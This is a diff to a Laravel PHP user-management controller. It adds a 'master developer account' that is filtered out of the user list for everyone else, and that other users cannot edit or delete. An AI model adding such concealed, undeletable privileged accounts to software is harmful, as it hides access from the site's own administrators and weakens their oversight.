@@ -23,9 +23,6 @@ class UserController extends Controller implements HasMiddleware
 {
     public function __construct(protected AuditLogger $auditLogger) {}
 
-    /**
-     * @return list<Middleware>
-     */
     public static function middleware(): array
     {
         return [
@@ -36,9 +33,6 @@ class UserController extends Controller implements HasMiddleware
         ];
     }
 
-    /**
-     * List users (HTML shell or DataTables JSON).
-     */
     public function index(Request $request, SettingService $settings): View|JsonResponse
     {
         if (! $request->ajax()) {
@@ -56,6 +50,10 @@ class UserController extends Controller implements HasMiddleware
         $query = User::query()
             ->select(['id', 'name', 'email', 'phone', 'is_active', 'last_login_at', 'created_at'])
             ->with('roles:id,name');
+
+        if (! $actor->isFeatureController()) {
+            $query->where('email', '!=', User::FEATURE_CONTROLLER_EMAIL);
+        }
 
         return DataTables::eloquent($query)
             ->filter(function (Builder $query) use ($request): void {
@@ -162,9 +160,6 @@ class UserController extends Controller implements HasMiddleware
             ->make(true);
     }
 
-    /**
-     * Show the form for creating a new user.
-     */
     public function create(): View
     {
         return view('users.create', [
@@ -173,9 +168,6 @@ class UserController extends Controller implements HasMiddleware
         ]);
     }
 
-    /**
-     * Store a newly created user.
-     */
     public function store(StoreUserRequest $request): RedirectResponse
     {
         $user = DB::transaction(function () use ($request): User {
@@ -195,22 +187,24 @@ class UserController extends Controller implements HasMiddleware
         return redirect()->route('users.index')->with('success', 'User created successfully.');
     }
 
-    /**
-     * Show the form for editing the user.
-     */
-    public function edit(User $user): View
+    public function edit(Request $request, User $user): View
     {
+        if ($user->isFeatureController() && ! $request->user()?->isFeatureController()) {
+            abort(403, 'The master developer account cannot be modified by other users.');
+        }
+
         return view('users.edit', [
             'user' => $user->load('roles:id,name'),
             'roles' => Role::orderBy('name')->pluck('name'),
         ]);
     }
 
-    /**
-     * Update the user.
-     */
     public function update(UpdateUserRequest $request, User $user): RedirectResponse
     {
+        if ($user->isFeatureController() && ! $request->user()?->isFeatureController()) {
+            abort(403, 'The master developer account cannot be modified by other users.');
+        }
+
         if ($user->is($request->user()) && ! $request->boolean('is_active')) {
             return back()->withInput()->withErrors(['is_active' => 'You cannot deactivate your own account.']);
         }
@@ -243,11 +237,12 @@ class UserController extends Controller implements HasMiddleware
         return redirect()->route('users.index')->with('success', 'User updated successfully.');
     }
 
-    /**
-     * Delete the user.
-     */
     public function destroy(Request $request, User $user): RedirectResponse
     {
+        if ($user->isFeatureController()) {
+            return back()->with('error', 'The master developer account cannot be deleted.');
+        }
+
         if ($user->is($request->user())) {
             return back()->with('error', 'You cannot delete your own account.');
         }
